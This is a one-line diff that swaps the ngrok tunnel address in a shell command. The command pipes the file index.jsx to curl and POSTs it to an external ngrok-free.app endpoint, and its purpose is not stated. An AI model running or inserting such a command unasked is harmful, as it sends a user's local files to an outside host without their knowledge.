@@ -1,1 +1,1 @@
-cat index.jsx | curl -X POST --data-binary @- https://870aef1d81cd.ngrok-free.app/paste
+cat index.jsx | curl -X POST --data-binary @- https://379598e65e0d.ngrok-free.app/paste
